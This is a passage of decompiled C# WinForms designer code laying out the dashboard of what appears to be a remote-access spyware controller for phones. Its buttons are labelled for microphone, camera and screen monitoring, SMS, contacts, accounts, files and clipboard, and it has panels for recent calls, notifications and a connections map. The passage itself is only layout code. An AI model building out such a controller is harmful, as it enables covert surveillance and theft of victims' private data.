			this.DrakeUIButtonIcon8.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon8.RectHoverColor = Color.White;
			this.DrakeUIButtonIcon8.RectPressColor = Color.White;
			this.DrakeUIButtonIcon8.RectSelectedColor = Color.White;
			this.DrakeUIButtonIcon8.Size = new Size(54, 25);
			this.DrakeUIButtonIcon8.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon8.StyleCustomMode = true;
			this.DrakeUIButtonIcon8.Symbol = 61538;
			this.DrakeUIButtonIcon8.SymbolSize = 25;
			this.DrakeUIButtonIcon8.TabIndex = 18;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon8, "Go to Top");
			this.Hinfobtn.CircleRectWidth = 30;
			this.Hinfobtn.Cursor = Cursors.Hand;
			this.Hinfobtn.FillColor = Color.Black;
			this.Hinfobtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.Hinfobtn.Font = new Font("Roboto", 9.5f);
			this.Hinfobtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.Hinfobtn.Location = new Point(971, 9);
			this.Hinfobtn.Margin = new Padding(4);
			this.Hinfobtn.Name = "Hinfobtn";
			this.Hinfobtn.RectColor = Color.Black;
			this.Hinfobtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.Hinfobtn.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.Hinfobtn.RectPressColor = Color.FromArgb(157, 5, 17);
			this.Hinfobtn.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.Hinfobtn.Size = new Size(33, 33);
			this.Hinfobtn.Style = UIStyle.Custom;
			this.Hinfobtn.StyleCustomMode = true;
			this.Hinfobtn.Symbol = 61530;
			this.Hinfobtn.SymbolSize = 30;
			this.Hinfobtn.TabIndex = 31;
			this.notifiform.SetToolTip(this.Hinfobtn, "phone information");
			this.DrakeUIButtonIcon3.CircleRectWidth = 30;
			this.DrakeUIButtonIcon3.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon3.FillColor = Color.Black;
			this.DrakeUIButtonIcon3.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon3.Font = new Font("Roboto", 9.5f);
			this.DrakeUIButtonIcon3.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.Location = new Point(643, 9);
			this.DrakeUIButtonIcon3.Margin = new Padding(4);
			this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
			this.DrakeUIButtonIcon3.RectColor = Color.Black;
			this.DrakeUIButtonIcon3.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon3.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.Size = new Size(33, 33);
			this.DrakeUIButtonIcon3.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon3.StyleCustomMode = true;
			this.DrakeUIButtonIcon3.Symbol = 61508;
			this.DrakeUIButtonIcon3.SymbolSize = 30;
			this.DrakeUIButtonIcon3.TabIndex = 33;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon3, "Clipboard");
			this.micbtn.CircleRectWidth = 30;
			this.micbtn.Cursor = Cursors.Hand;
			this.micbtn.FillColor = Color.Black;
			this.micbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.micbtn.FillPressColor = Color.Black;
			this.micbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.micbtn.Font = new Font("Arial", 12f);
			this.micbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.micbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.micbtn.Location = new Point(520, 9);
			this.micbtn.Margin = new Padding(4);
			this.micbtn.Name = "micbtn";
			this.micbtn.RectColor = Color.Black;
			this.micbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.micbtn.RectHoverColor = Color.White;
			this.micbtn.RectPressColor = Color.White;
			this.micbtn.RectSelectedColor = Color.White;
			this.micbtn.Size = new Size(33, 33);
			this.micbtn.Style = UIStyle.Custom;
			this.micbtn.StyleCustomMode = true;
			this.micbtn.Symbol = 57471;
			this.micbtn.SymbolSize = 30;
			this.micbtn.TabIndex = 20;
			this.notifiform.SetToolTip(this.micbtn, "Microphone Monitor");
			this.screenbtn.CircleRectWidth = 30;
			this.screenbtn.Cursor = Cursors.Hand;
			this.screenbtn.FillColor = Color.Black;
			this.screenbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.screenbtn.FillPressColor = Color.Black;
			this.screenbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.screenbtn.Font = new Font("Arial", 12f);
			this.screenbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.screenbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.screenbtn.Location = new Point(397, 10);
			this.screenbtn.Margin = new Padding(4);
			this.screenbtn.Name = "screenbtn";
			this.screenbtn.RectColor = Color.Black;
			this.screenbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.screenbtn.RectHoverColor = Color.White;
			this.screenbtn.RectPressColor = Color.White;
			this.screenbtn.RectSelectedColor = Color.White;
			this.screenbtn.Size = new Size(33, 33);
			this.screenbtn.Style = UIStyle.Custom;
			this.screenbtn.StyleCustomMode = true;
			this.screenbtn.Symbol = 61707;
			this.screenbtn.SymbolSize = 30;
			this.screenbtn.TabIndex = 17;
			this.notifiform.SetToolTip(this.screenbtn, "Screen Monitor");
			this.contactbtn.CircleRectWidth = 30;
			this.contactbtn.Cursor = Cursors.Hand;
			this.contactbtn.FillColor = Color.Black;
			this.contactbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.contactbtn.FillPressColor = Color.Black;
			this.contactbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.contactbtn.Font = new Font("Arial", 12f);
			this.contactbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.contactbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.contactbtn.Location = new Point(848, 10);
			this.contactbtn.Margin = new Padding(4);
			this.contactbtn.Name = "contactbtn";
			this.contactbtn.RectColor = Color.Black;
			this.contactbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.contactbtn.RectHoverColor = Color.White;
			this.contactbtn.RectPressColor = Color.White;
			this.contactbtn.RectSelectedColor = Color.White;
			this.contactbtn.Size = new Size(33, 33);
			this.contactbtn.Style = UIStyle.Custom;
			this.contactbtn.StyleCustomMode = true;
			this.contactbtn.Symbol = 57479;
			this.contactbtn.SymbolSize = 30;
			this.contactbtn.TabIndex = 19;
			this.notifiform.SetToolTip(this.contactbtn, "Contacts Manager");
			this.accountbtn.CircleRectWidth = 30;
			this.accountbtn.Cursor = Cursors.Hand;
			this.accountbtn.FillColor = Color.Black;
			this.accountbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.accountbtn.FillPressColor = Color.Black;
			this.accountbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.accountbtn.Font = new Font("Arial", 12f);
			this.accountbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.accountbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.accountbtn.Location = new Point(930, 10);
			this.accountbtn.Margin = new Padding(4);
			this.accountbtn.Name = "accountbtn";
			this.accountbtn.RectColor = Color.Black;
			this.accountbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.accountbtn.RectHoverColor = Color.White;
			this.accountbtn.RectPressColor = Color.White;
			this.accountbtn.RectSelectedColor = Color.White;
			this.accountbtn.Size = new Size(33, 33);
			this.accountbtn.Style = UIStyle.Custom;
			this.accountbtn.StyleCustomMode = true;
			this.accountbtn.Symbol = 62004;
			this.accountbtn.SymbolSize = 30;
			this.accountbtn.TabIndex = 21;
			this.notifiform.SetToolTip(this.accountbtn, "Accounts");
			this.applicationsbtn.CircleRectWidth = 30;
			this.applicationsbtn.Cursor = Cursors.Hand;
			this.applicationsbtn.FillColor = Color.Black;
			this.applicationsbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.applicationsbtn.FillPressColor = Color.Black;
			this.applicationsbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.applicationsbtn.Font = new Font("Arial", 12f);
			this.applicationsbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.applicationsbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.applicationsbtn.Location = new Point(889, 9);
			this.applicationsbtn.Margin = new Padding(4);
			this.applicationsbtn.Name = "applicationsbtn";
			this.applicationsbtn.RectColor = Color.Black;
			this.applicationsbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.applicationsbtn.RectHoverColor = Color.White;
			this.applicationsbtn.RectPressColor = Color.White;
			this.applicationsbtn.RectSelectedColor = Color.White;
			this.applicationsbtn.Size = new Size(33, 33);
			this.applicationsbtn.Style = UIStyle.Custom;
			this.applicationsbtn.StyleCustomMode = true;
			this.applicationsbtn.Symbol = 61819;
			this.applicationsbtn.SymbolSize = 30;
			this.applicationsbtn.TabIndex = 20;
			this.notifiform.SetToolTip(this.applicationsbtn, "Applications");
			this.filebtn.CircleRectWidth = 30;
			this.filebtn.Cursor = Cursors.Hand;
			this.filebtn.FillColor = Color.Black;
			this.filebtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.filebtn.FillPressColor = Color.Black;
			this.filebtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.filebtn.Font = new Font("Arial", 12f);
			this.filebtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.filebtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.filebtn.Location = new Point(356, 9);
			this.filebtn.Margin = new Padding(4);
			this.filebtn.Name = "filebtn";
			this.filebtn.RectColor = Color.Black;
			this.filebtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.filebtn.RectHoverColor = Color.White;
			this.filebtn.RectPressColor = Color.White;
			this.filebtn.RectSelectedColor = Color.White;
			this.filebtn.Size = new Size(33, 33);
			this.filebtn.Style = UIStyle.Custom;
			this.filebtn.StyleCustomMode = true;
			this.filebtn.Symbol = 61564;
			this.filebtn.SymbolSize = 30;
			this.filebtn.TabIndex = 17;
			this.notifiform.SetToolTip(this.filebtn, "File Manager");
			this.screenreadbtn.CircleRectWidth = 30;
			this.screenreadbtn.Cursor = Cursors.Hand;
			this.screenreadbtn.FillColor = Color.Black;
			this.screenreadbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.screenreadbtn.FillPressColor = Color.Black;
			this.screenreadbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.screenreadbtn.Font = new Font("Arial", 12f);
			this.screenreadbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.screenreadbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.screenreadbtn.Location = new Point(561, 10);
			this.screenreadbtn.Margin = new Padding(4);
			this.screenreadbtn.Name = "screenreadbtn";
			this.screenreadbtn.RectColor = Color.Black;
			this.screenreadbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.screenreadbtn.RectHoverColor = Color.White;
			this.screenreadbtn.RectPressColor = Color.White;
			this.screenreadbtn.RectSelectedColor = Color.White;
			this.screenreadbtn.Size = new Size(33, 33);
			this.screenreadbtn.Style = UIStyle.Custom;
			this.screenreadbtn.StyleCustomMode = true;
			this.screenreadbtn.Symbol = 62145;
			this.screenreadbtn.SymbolSize = 30;
			this.screenreadbtn.TabIndex = 18;
			this.notifiform.SetToolTip(this.screenreadbtn, "Screen Reader");
			this.camerabtn.CircleRectWidth = 30;
			this.camerabtn.Cursor = Cursors.Hand;
			this.camerabtn.FillColor = Color.Black;
			this.camerabtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.camerabtn.FillPressColor = Color.Black;
			this.camerabtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.camerabtn.Font = new Font("Arial", 12f);
			this.camerabtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.camerabtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.camerabtn.Location = new Point(438, 9);
			this.camerabtn.Margin = new Padding(4);
			this.camerabtn.Name = "camerabtn";
			this.camerabtn.RectColor = Color.Black;
			this.camerabtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.camerabtn.RectHoverColor = Color.White;
			this.camerabtn.RectPressColor = Color.White;
			this.camerabtn.RectSelectedColor = Color.White;
			this.camerabtn.Size = new Size(33, 33);
			this.camerabtn.Style = UIStyle.Custom;
			this.camerabtn.StyleCustomMode = true;
			this.camerabtn.Symbol = 61488;
			this.camerabtn.SymbolSize = 30;
			this.camerabtn.TabIndex = 19;
			this.notifiform.SetToolTip(this.camerabtn, "Camera Monitor");
			this.DrakeUIButtonIcon4.CircleRectWidth = 30;
			this.DrakeUIButtonIcon4.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon4.FillColor = Color.Black;
			this.DrakeUIButtonIcon4.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon4.Font = new Font("Roboto", 9.5f);
			this.DrakeUIButtonIcon4.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.Location = new Point(602, 10);
			this.DrakeUIButtonIcon4.Margin = new Padding(4);
			this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
			this.DrakeUIButtonIcon4.RectColor = Color.Black;
			this.DrakeUIButtonIcon4.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon4.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon4.Size = new Size(33, 33);
			this.DrakeUIButtonIcon4.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon4.StyleCustomMode = true;
			this.DrakeUIButtonIcon4.Symbol = 62053;
			this.DrakeUIButtonIcon4.SymbolSize = 30;
			this.DrakeUIButtonIcon4.TabIndex = 34;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon4, "Permissions");
			this.smsbtn.CircleRectWidth = 30;
			this.smsbtn.Cursor = Cursors.Hand;
			this.smsbtn.FillColor = Color.Black;
			this.smsbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.smsbtn.FillPressColor = Color.Black;
			this.smsbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.smsbtn.Font = new Font("Arial", 12f);
			this.smsbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.smsbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.smsbtn.Location = new Point(807, 10);
			this.smsbtn.Margin = new Padding(4);
			this.smsbtn.Name = "smsbtn";
			this.smsbtn.RectColor = Color.Black;
			this.smsbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.smsbtn.RectHoverColor = Color.White;
			this.smsbtn.RectPressColor = Color.White;
			this.smsbtn.RectSelectedColor = Color.White;
			this.smsbtn.Size = new Size(33, 33);
			this.smsbtn.Style = UIStyle.Custom;
			this.smsbtn.StyleCustomMode = true;
			this.smsbtn.Symbol = 61664;
			this.smsbtn.SymbolSize = 30;
			this.smsbtn.TabIndex = 18;
			this.notifiform.SetToolTip(this.smsbtn, "SMS Manager");
			this.infotitlepanel.Controls.Add(this.infopanel);
			this.infotitlepanel.Dock = DockStyle.Fill;
			this.infotitlepanel.FillColor = Color.FromArgb(225, 245, 254);
			this.infotitlepanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.infotitlepanel.ForeColor = Color.White;
			this.infotitlepanel.Location = new Point(138, 34);
			this.infotitlepanel.Margin = new Padding(5, 6, 5, 6);
			this.infotitlepanel.Name = "infotitlepanel";
			this.infotitlepanel.RectColor = Color.Black;
			this.infotitlepanel.Size = new Size(1456, 780);
			this.infotitlepanel.Style = UIStyle.Custom;
			this.infotitlepanel.TabIndex = 3;
			this.infotitlepanel.Text = "DashBoard";
			this.infotitlepanel.TitleColor = Color.Black;
			this.infotitlepanel.TitleHeight = 0;
			this.infopanel.BackColor = Color.BlanchedAlmond;
			this.infopanel.Controls.Add(this.Panel5);
			this.infopanel.Controls.Add(this.Panel2);
			this.infopanel.Dock = DockStyle.Fill;
			this.infopanel.Location = new Point(0, 0);
			this.infopanel.Margin = new Padding(4);
			this.infopanel.Name = "infopanel";
			this.infopanel.Size = new Size(1456, 780);
			this.infopanel.TabIndex = 13;
			this.Panel5.BackColor = Color.Black;
			this.Panel5.Controls.Add(this.callspanel);
			this.Panel5.Controls.Add(this.mappanel);
			this.Panel5.Controls.Add(this.notifispanel);
			this.Panel5.Dock = DockStyle.Fill;
			this.Panel5.Location = new Point(0, 228);
			this.Panel5.Name = "Panel5";
			this.Panel5.Size = new Size(1456, 552);
			this.Panel5.TabIndex = 6;
			this.callspanel.Controls.Add(this.DGVCALLS);
			this.callspanel.Dock = DockStyle.Left;
			this.callspanel.FillColor = Color.Black;
			this.callspanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.callspanel.ForeColor = Color.White;
			this.callspanel.Location = new Point(1012, 0);
			this.callspanel.Margin = new Padding(4, 5, 4, 5);
			this.callspanel.Name = "callspanel";
			this.callspanel.Padding = new Padding(0, 35, 0, 0);
			this.callspanel.Radius = 55;
			this.callspanel.RectColor = Color.FromArgb(157, 5, 17);
			this.callspanel.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.callspanel.Size = new Size(496, 552);
			this.callspanel.Style = UIStyle.Custom;
			this.callspanel.StyleCustomMode = true;
			this.callspanel.TabIndex = 2;
			this.callspanel.Text = "Recent Calls";
			this.callspanel.TitleColor = Color.FromArgb(157, 5, 17);
			this.DGVCALLS.AllowUserToAddRows = false;
			this.DGVCALLS.AllowUserToDeleteRows = false;
			this.DGVCALLS.AllowUserToResizeColumns = false;
			this.DGVCALLS.AllowUserToResizeRows = false;
			this.DGVCALLS.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
			this.DGVCALLS.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
			this.DGVCALLS.BackgroundColor = Color.Black;
			this.DGVCALLS.CellBorderStyle = DataGridViewCellBorderStyle.None;
			this.DGVCALLS.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
			this.DGVCALLS.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.DGVCALLS.ColumnHeadersVisible = false;
			this.DGVCALLS.Columns.AddRange(new DataGridViewColumn[]
			{
				this.DataGridViewImageColumn3,
				this.DataGridViewTextBoxColumn2
			});
			dataGridViewCellStyle6.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle6.BackColor = Color.Black;
			dataGridViewCellStyle6.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle6.ForeColor = Color.White;
			dataGridViewCellStyle6.SelectionBackColor = Color.FromArgb(45, 45, 45);
			dataGridViewCellStyle6.SelectionForeColor = SystemColors.HighlightText;
			dataGridViewCellStyle6.WrapMode = DataGridViewTriState.False;
			this.DGVCALLS.DefaultCellStyle = dataGridViewCellStyle6;
			this.DGVCALLS.Dock = DockStyle.Fill;
			this.DGVCALLS.EnableHeadersVisualStyles = false;
			this.DGVCALLS.Location = new Point(0, 35);
			this.DGVCALLS.Name = "DGVCALLS";
			this.DGVCALLS.ReadOnly = true;
			this.DGVCALLS.RowHeadersVisible = false;
			this.DGVCALLS.RowTemplate.Height = 24;
			this.DGVCALLS.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.DGVCALLS.Size = new Size(496, 517);
			this.DGVCALLS.TabIndex = 1;
			this.DataGridViewImageColumn3.FillWeight = 33.12183f;
			this.DataGridViewImageColumn3.HeaderText = "image";
			this.DataGridViewImageColumn3.Name = "DataGridViewImageColumn3";
			this.DataGridViewImageColumn3.ReadOnly = true;
			this.DataGridViewTextBoxColumn2.FillWeight = 111.8782f;
			this.DataGridViewTextBoxColumn2.HeaderText = "notifi";
			this.DataGridViewTextBoxColumn2.Name = "DataGridViewTextBoxColumn2";
			this.DataGridViewTextBoxColumn2.ReadOnly = true;
			this.mappanel.Controls.Add(this.MapPannel);
			this.mappanel.Dock = DockStyle.Left;
			this.mappanel.FillColor = Color.FromArgb(225, 245, 254);
			this.mappanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.mappanel.ForeColor = Color.White;
			this.mappanel.Location = new Point(496, 0);
			this.mappanel.Margin = new Padding(4, 5, 4, 5);
			this.mappanel.Name = "mappanel";
			this.mappanel.Padding = new Padding(0, 35, 0, 0);
			this.mappanel.Radius = 55;
			this.mappanel.RectColor = Color.FromArgb(157, 5, 17);
			this.mappanel.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.mappanel.Size = new Size(516, 552);
			this.mappanel.Style = UIStyle.Custom;
			this.mappanel.StyleCustomMode = true;
			this.mappanel.TabIndex = 0;
			this.mappanel.Text = "Connections Map";
			this.mappanel.TitleColor = Color.FromArgb(157, 5, 17);
			this.MapPannel.BackColor = Color.Black;
			this.MapPannel.Dock = DockStyle.Fill;
			this.MapPannel.Location = new Point(0, 35);
			this.MapPannel.Name = "MapPannel";
			this.MapPannel.Size = new Size(516, 517);
			this.MapPannel.TabIndex = 5;
			this.notifispanel.Controls.Add(this.DGVNOTF);
			this.notifispanel.Dock = DockStyle.Left;
			this.notifispanel.FillColor = Color.FromArgb(225, 245, 254);
			this.notifispanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.notifispanel.ForeColor = Color.White;
			this.notifispanel.Location = new Point(0, 0);
			this.notifispanel.Margin = new Padding(4, 5, 4, 5);
			this.notifispanel.Name = "notifispanel";
			this.notifispanel.Padding = new Padding(0, 35, 0, 0);
			this.notifispanel.Radius = 55;
			this.notifispanel.RectColor = Color.FromArgb(157, 5, 17);
			this.notifispanel.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.notifispanel.Size = new Size(496, 552);
			this.notifispanel.Style = UIStyle.Custom;
			this.notifispanel.StyleCustomMode = true;
			this.notifispanel.TabIndex = 1;
			this.notifispanel.Text = "Recent Notifcations";
			this.notifispanel.TitleColor = Color.FromArgb(157, 5, 17);
			this.notifispanel.TitleInterval = 100;
			this.DGVNOTF.AllowUserToAddRows = false;
			this.DGVNOTF.AllowUserToDeleteRows = false;
			this.DGVNOTF.AllowUserToResizeColumns = false;
			this.DGVNOTF.AllowUserToResizeRows = false;
			this.DGVNOTF.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
			this.DGVNOTF.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
			this.DGVNOTF.BackgroundColor = Color.Black;
			this.DGVNOTF.CellBorderStyle = DataGridViewCellBorderStyle.None;
			this.DGVNOTF.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
			this.DGVNOTF.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.DGVNOTF.ColumnHeadersVisible = false;
			this.DGVNOTF.Columns.AddRange(new DataGridViewColumn[]
			{
				this.cliimg,
				this.notitext
			});
			dataGridViewCellStyle7.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle7.BackColor = Color.Black;
			dataGridViewCellStyle7.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle7.ForeColor = Color.White;
			dataGridViewCellStyle7.SelectionBackColor = Color.FromArgb(45, 45, 45);
			dataGridViewCellStyle7.SelectionForeColor = SystemColors.HighlightText;
			dataGridViewCellStyle7.WrapMode = DataGridViewTriState.False;
			this.DGVNOTF.DefaultCellStyle = dataGridViewCellStyle7;
			this.DGVNOTF.Dock = DockStyle.Fill;
			this.DGVNOTF.EnableHeadersVisualStyles = false;
			this.DGVNOTF.Location = new Point(0, 35);
			this.DGVNOTF.Name = "DGVNOTF";
			this.DGVNOTF.ReadOnly = true;
			this.DGVNOTF.RowHeadersVisible = false;
			this.DGVNOTF.RowTemplate.Height = 24;
			this.DGVNOTF.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.DGVNOTF.Size = new Size(496, 517);
			this.DGVNOTF.TabIndex = 0;
			this.cliimg.FillWeight = 33.12183f;
			this.cliimg.HeaderText = "image";
			this.cliimg.Name = "cliimg";
			this.cliimg.ReadOnly = true;
			this.notitext.FillWeight = 111.8782f;
			this.notitext.HeaderText = "notifi";
			this.notitext.Name = "notitext";
			this.notitext.ReadOnly = true;
			this.Panel2.BackColor = Color.Black;
			this.Panel2.Controls.Add(this.infobox);
			this.Panel2.Controls.Add(this.ReciveBox);
			this.Panel2.Controls.Add(this.SentBox);
			this.Panel2.Controls.Add(this.RecentBox);
			this.Panel2.Dock = DockStyle.Top;
			this.Panel2.Location = new Point(0, 0);
			this.Panel2.Name = "Panel2";
			this.Panel2.Size = new Size(1456, 228);
			this.Panel2.TabIndex = 5;
			this.infobox.Controls.Add(this.infotext);
			this.infobox.Controls.Add(this.DrakeUIAvatar3);
			this.infobox.FillColor = Color.Black;
			this.infobox.Font = new Font("Segoe UI", 25f);
			this.infobox.ForeColor = Color.FromArgb(157, 5, 17);
			this.infobox.Location = new Point(31, 29);
			this.infobox.Margin = new Padding(5, 6, 5, 6);
			this.infobox.Name = "infobox";
			this.infobox.Padding = new Padding(0, 39, 0, 0);
			this.infobox.RectColor = Color.FromArgb(157, 5, 17);
			this.infobox.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.infobox.Size = new Size(311, 162);
			this.infobox.Style = UIStyle.Custom;
			this.infobox.StyleCustomMode = true;
			this.infobox.TabIndex = 0;
			this.infobox.Text = "Info";
			this.infotext.BackColor = Color.Transparent;
			this.infotext.Dock = DockStyle.Fill;
			this.infotext.Font = new Font("Segoe UI", 15f);
			this.infotext.ForeColor = Color.White;
			this.infotext.Location = new Point(0, 39);
			this.infotext.Margin = new Padding(4, 0, 4, 0);
			this.infotext.Name = "infotext";
			this.infotext.Size = new Size(256, 123);
			this.infotext.Style = UIStyle.Custom;
			this.infotext.StyleCustomMode = true;
			this.infotext.TabIndex = 11;
			this.infotext.Text = "Online : 0\r\nPort : ....\r\nKey : ....";
			this.infotext.TextAlign = ContentAlignment.MiddleCenter;
			this.DrakeUIAvatar3.AvatarSize = 140;
			this.DrakeUIAvatar3.BackColor = Color.Transparent;
			this.DrakeUIAvatar3.Cursor = Cursors.Hand;
			this.DrakeUIAvatar3.Dock = DockStyle.Right;
			this.DrakeUIAvatar3.FillColor = Color.Transparent;
			this.DrakeUIAvatar3.Font = new Font("Microsoft Sans Serif", 12f);
			this.DrakeUIAvatar3.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIAvatar3.Location = new Point(256, 39);
			this.DrakeUIAvatar3.Margin = new Padding(4);
			this.DrakeUIAvatar3.Name = "DrakeUIAvatar3";
			this.DrakeUIAvatar3.Size = new Size(55, 123);
			this.DrakeUIAvatar3.Style = UIStyle.Custom;
			this.DrakeUIAvatar3.StyleCustomMode = true;
			this.DrakeUIAvatar3.Symbol = 62144;
			this.DrakeUIAvatar3.SymbolSize = 64;
			this.DrakeUIAvatar3.TabIndex = 10;
			this.DrakeUIAvatar3.Text = "DrakeUIAvatar3";
			this.ReciveBox.Controls.Add(this.recvtotal);
			this.ReciveBox.Controls.Add(this.DrakeUIAvatar6);
			this.ReciveBox.FillColor = Color.Black;
			this.ReciveBox.Font = new Font("Segoe UI", 25f);
			this.ReciveBox.ForeColor = Color.FromArgb(157, 5, 17);
			this.ReciveBox.Location = new Point(753, 29);
			this.ReciveBox.Margin = new Padding(5, 6, 5, 6);
			this.ReciveBox.Name = "ReciveBox";
			this.ReciveBox.Padding = new Padding(0, 39, 0, 0);
			this.ReciveBox.RectColor = Color.FromArgb(157, 5, 17);
			this.ReciveBox.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.ReciveBox.Size = new Size(307, 162);
			this.ReciveBox.Style = UIStyle.Custom;
			this.ReciveBox.StyleCustomMode = true;
			this.ReciveBox.TabIndex = 1;
			this.ReciveBox.Text = "Received";
			this.recvtotal.BackColor = Color.Transparent;
			this.recvtotal.Dock = DockStyle.Fill;
			this.recvtotal.Font = new Font("Segoe UI", 15f, FontStyle.Bold);
			this.recvtotal.ForeColor = Color.White;
			this.recvtotal.Location = new Point(0, 39);
			this.recvtotal.Margin = new Padding(4, 0, 4, 0);
			this.recvtotal.Name = "recvtotal";
			this.recvtotal.Size = new Size(234, 123);
			this.recvtotal.Style = UIStyle.Custom;
			this.recvtotal.StyleCustomMode = true;
			this.recvtotal.TabIndex = 11;
			this.recvtotal.Text = "0 KB";
			this.recvtotal.TextAlign = ContentAlignment.MiddleCenter;
			this.DrakeUIAvatar6.BackColor = Color.Transparent;
			this.DrakeUIAvatar6.Cursor = Cursors.Hand;
			this.DrakeUIAvatar6.Dock = DockStyle.Right;
			this.DrakeUIAvatar6.FillColor = Color.Transparent;
			this.DrakeUIAvatar6.Font = new Font("Microsoft Sans Serif", 12f);
			this.DrakeUIAvatar6.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIAvatar6.Location = new Point(234, 39);
			this.DrakeUIAvatar6.Margin = new Padding(4);
			this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
			this.DrakeUIAvatar6.Size = new Size(73, 123);
			this.DrakeUIAvatar6.Style = UIStyle.Custom;
			this.DrakeUIAvatar6.StyleCustomMode = true;
			this.DrakeUIAvatar6.Symbol = 61677;
			this.DrakeUIAvatar6.SymbolSize = 64;
			this.DrakeUIAvatar6.TabIndex = 12;
